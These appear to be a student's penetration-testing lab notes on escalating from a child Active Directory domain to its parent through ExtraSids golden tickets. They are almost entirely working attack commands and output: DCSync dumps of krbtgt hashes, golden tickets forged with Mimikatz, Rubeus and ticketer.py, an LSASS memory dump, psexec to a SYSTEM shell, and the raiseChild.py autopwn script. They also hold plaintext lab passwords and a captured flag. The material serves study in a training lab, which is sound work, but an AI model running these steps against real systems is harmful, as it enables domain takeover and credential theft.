# Attacking Domain Trusts - Child -> Parent Trusts

## From Windows

### SID History Primer

The sidHistory attribute is used in migration scenarios.
The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain.

Attack : SID history injection and add an administrator account to the SID History attribute of an account they control

#### ExtraSids Attack - Mimikatz

Prerequisites :

- The KRBTGT hash for the child domain
- The SID for the child domain
- The SID of the Enterprise Admins group of the root domain.
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.

1) Obtaining the KRBTGT Account's NT Hash using Mimikatz
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt

2) Using Get-DomainSID
Get-DomainSID
S-1-5-21-2806153819-209893948-922872689

3) Obtaining Enterprise Admins Group's SID using Get-DomainGroup
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

distinguishedname                                       objectsid                                    
-----------------                                       ---------                                    
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519

4) Using ls to Confirm No Access
ls \\academy-ea-dc01.inlanefreight.local\c$

ls : Access is denied

5) Creating a Golden Ticket with Mimikatz
mimikatz.exe
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

--> S-1-5-21-2806153819-209893948-922872689 is the current domain SID
--> S-1-5-21-3842939050-3880317879-2865463114-519 : SID of Targeted Group
--> hacker is an arbitrary user which doesn't need to exist in the target domain

6) Confirming a Kerberos Ticket is in Memory Using klist
klist

7) Listing the Entire C: Drive of the Domain Controller
ls \\academy-ea-dc01.inlanefreight.local\c$
 Volume in drive \\academy-ea-dc01.inlanefreight.local\c$ has no label.
 Volume Serial Number is B8B3-0D72

 Directory of \\academy-ea-dc01.inlanefreight.local\c$

09/15/2018  12:19 AM    <DIR>          PerfLogs

#### ExtraSids Attack - Rubeus

4) Using ls to Confirm No Access Before Running Rubeus
ls \\academy-ea-dc01.inlanefreight.local\c$

ls : Access is denied
At line:1 char:1
+ ls \\academy-ea-dc01.inlanefreight.local\c$
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\academy-ea-dc01.inlanefreight.local\c$:String) [Get-ChildItem], UnauthorizedAcces 
   sException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
	
<SNIP>

5) Creating a Golden Ticket using Rubeus
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

--> S-1-5-21-3842939050-3880317879-2865463114-519 : SID of Targeted Group

6) Confirming the Ticket is in Memory Using klist
klist

7) Performing a DCSync Attack
C:\Tools\mimikatz\x64> .\mimikatz.exe

mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm

If dealing with multiple domains, we will need to specify the exact domain :
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL

## From Linux

### SID History Primer using Impacket

1) Performing DCSync with secretsdump.py to grab the NTLM hash for the KRBTGT account
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt

krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::

2) Looking for the Domain SID
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"

Password:

[*] Domain SID is: S-1-5-21-2806153819-209893948-92287268

3) Grabbing the Domain SID & Attaching to Enterprise Admin's RID
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

Password:
[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)

4) Constructing a Golden Ticket using ticketer.py
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

--> The KRBTGT hash for the child domain: 9d765b482771505cbe97411065964d5f
--> The SID for the child domain: S-1-5-21-2806153819-209893948-922872689
--> The name of a target user in the child domain (does not need to exist!): hacker
--> The SID of the Enterprise Admins group of the root domain: S-1-5-21-3842939050-3880317879-2865463114-519

5) Setting the KRB5CCNAME Environment Variable
export KRB5CCNAME=hacker.ccache 

6) Getting a SYSTEM shell using Impacket's psexec.py
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5

C:\Windows\system32> whoami
nt authority\system
C:\Windows\system32> hostname
ACADEMY-EA-DC01

### Escalating from child to parent domain using raiseChild.py

Performing the Attack with raiseChild.py
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm

/!\ : be careful when running any sort of "autopwn" script like this




## LAB WINDOWS

xfreerdp /u:htb-student_adm /p:"HTB_@cademy_stdnt_admin!" /v:$TARGET

cd c:\tools
Import-Module .\PowerView.ps1
Get-DomainSID
S-1-5-21-2806153819-209893948-922872689

Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
distinguishedname                                       objectsid
-----------------                                       ---------
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519

cd .\mimikatz\x64\
.\mimikatz.exe

lsadump::dcsync /user:LOGISTICS\krbtgt

[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'LOGISTICS\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/1/2021 10:21:33 AM
Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9d765b482771505cbe97411065964d5f
    ntlm- 0: 9d765b482771505cbe97411065964d5f
    lm  - 0: 69df324191d4a80f0ed100c10f20561e

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 8c6b7919c01a5c654c91922f9a13225c

* Primary:Kerberos-Newer-Keys *
    Default Salt : LOGISTICS.INLANEFREIGHT.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
      aes128_hmac       (4096) : ca289e175c372cebd18083983f88c03e
      des_cbc_md5       (4096) : fee04c3d026d7538

* Primary:Kerberos *
    Default Salt : LOGISTICS.INLANEFREIGHT.LOCALkrbtgt
    Credentials
      des_cbc_md5       : fee04c3d026d7538

* Packages *
    NTLM-Strong-NTOWF


* Primary:WDigest *
    01  71fc2147dcf21fed982e180c3ebc48b8
    02  e193e66c97fb2ff16f352c25c06a5009
    03  9b4087c331fcd37671b407cb4f0e44a2
    04  71fc2147dcf21fed982e180c3ebc48b8
    05  e193e66c97fb2ff16f352c25c06a5009
    06  0da90377100224d5635e529d358f1409
    07  71fc2147dcf21fed982e180c3ebc48b8
    08  1763ae4e99694dcf66700106bb303aa5
    09  024c0c0c71f6e1f89a8c3be922534f0d
    10  3523e29569b4a45d20d99b7937f40326
    11  1763ae4e99694dcf66700106bb303aa5
    12  024c0c0c71f6e1f89a8c3be922534f0d
    13  5f47d51dee42d3f9a52a2d464c291fe5
    14  1763ae4e99694dcf66700106bb303aa5
    15  b7196b13a4fc2a29c18de543912039c2
    16  64689c7d74d2f2908330c62e47b34d75
    17  023f316da4715dd596d4ae6d5b9049cc
    18  fec7644b22077323cc9770c91d205269
    19  5cacbc938eaeb1b3a58572dafed92d97
    20  684ef5f716d49e4274a4ceb48d5fd6ba
    21  99968ef6b4c440cbd652ce6718a9ba39
    22  99968ef6b4c440cbd652ce6718a9ba39
    23  fbd2d7aef9329e981cd1bfdef2924843
    24  38653e1cf10018a3ae60fdb681241f1b
    25  5efd3ccfb3589c3bd6d76738ceeffb92
    26  dcd5dfeec024fe725edcaab5953d2011
    27  d92dcf29cd473a6ebae4b3bca1e578a9
    28  ff0382afc6adb89c00d5bf90cd5f4eca
    29  d7d958214c25d0835547320a0f0faf49

PS C:\Windows\system32> ls \\academy-ea-dc01.inlanefreight.local\c$
ls : Access is denied

klist

Current LogonId is 0:0xc8e6a

Cached Tickets: (5)

#0>     Client: htb-student_adm @ LOGISTICS.INLANEFREIGHT.LOCAL
        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 12/6/2023 4:26:28 (local)
        End Time:   12/6/2023 14:17:48 (local)
        Renew Time: 12/13/2023 4:17:48 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x2 -> DELEGATION
        Kdc Called: ACADEMY-EA-DC02

kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
User      : hacker
Domain    : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
SID       : S-1-5-21-2806153819-209893948-922872689
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-3842939050-3880317879-2865463114-519 ;
ServiceKey: 9d765b482771505cbe97411065964d5f - rc4_hmac_nt
Lifetime  : 12/6/2023 4:29:04 AM ; 12/3/2033 4:29:04 AM ; 12/3/2033 4:29:04 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' successfully submitted for current session

klist

Current LogonId is 0:0xc8e6a

Cached Tickets: (1)

#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 12/6/2023 4:29:04 (local)
        End Time:   12/3/2033 4:29:04 (local)
        Renew Time: 12/3/2033 4:29:04 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 ->

ls \\academy-ea-dc01.inlanefreight.local\c$


    Directory: \\academy-ea-dc01.inlanefreight.local\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/31/2022  12:34 PM                Department Shares
d-----         4/7/2022   2:31 PM                ExtraSids
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---         4/9/2022   4:59 PM                Program Files
d-----        9/15/2018   2:06 AM                Program Files (x86)
d-----        3/31/2022  11:09 AM                User Shares
d-r---        10/6/2021  10:31 AM                Users
d-----        4/18/2022  11:37 AM                Windows
d-----        3/31/2022  11:12 AM                ZZZ_archive


type \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt
f@ll1ng_l1k3_d0m1no3$


## LAB LINUX

ssh htb-student@$TARGET
HTB_@cademy_stdnt!

bross

raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
HTB_@cademy_stdnt_admin!

Get-DomainGroupMember -Identity "Enterprise Admins" -Recurse

tasklist /svc
lsass.exe                      680 Kdc, KeyIso, Netlogon, NTDS, SamSs          

rundll32 C:\windows\system32\comsvcs.dll, MiniDump 680 C:\lsass.dmp full

dir mimikatz /s
WHERE /r \\Server64\Share1 Zappa.*

secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-ntlm
HTB_@cademy_stdnt_admin!

secretsdump.py -just-dc-ntlm LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5 | grep bross
inlanefreight.local\bross:1179:aad3b435b51404eeaad3b435b51404ee:49a074a39dd0651f647e765c2cc794c7:::
